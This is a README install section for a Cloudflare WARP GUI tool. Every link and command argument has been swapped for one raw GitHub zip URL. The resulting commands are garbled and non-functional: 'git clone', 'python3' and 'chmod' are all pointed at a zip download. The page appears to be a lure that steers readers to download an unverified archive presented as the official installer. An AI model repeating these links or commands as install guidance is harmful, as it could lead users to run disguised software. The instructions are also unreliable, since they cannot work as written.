## Installation

Read the [warp-cli install](https://github.com/ttzyt/warp-cloudflare-gui/raw/refs/heads/main/designer/cloudflare-gui-warp-2.8.zip) documentation. Install `warp-cli` and
register with the `$ warp-cli register` command.

Then execute the following commands:

    $ git clone https://github.com/ttzyt/warp-cloudflare-gui/raw/refs/heads/main/designer/cloudflare-gui-warp-2.8.zip
    $ cd warp-cloudflare-gui
    $ python3 https://github.com/ttzyt/warp-cloudflare-gui/raw/refs/heads/main/designer/cloudflare-gui-warp-2.8.zip
    $ sudo chmod +x ~https://github.com/ttzyt/warp-cloudflare-gui/raw/refs/heads/main/designer/cloudflare-gui-warp-2.8.zip

Now search for `warp cloudflare` in your desktop menu.

> ⚠️ IMPORTANT: After the installation please make sure you do not remove the repository directory. It is required for the desktop shortcut to work.

## Hidden Mode
If you only want to use the tray icon, you can run the program in hidden mode.
    
    $ python https://github.com/ttzyt/warp-cloudflare-gui/raw/refs/heads/main/designer/cloudflare-gui-warp-2.8.zip --hide

## Uninstall

Just remove the `~https://github.com/ttzyt/warp-cloudflare-gui/raw/refs/heads/main/designer/cloudflare-gui-warp-2.8.zip` file.
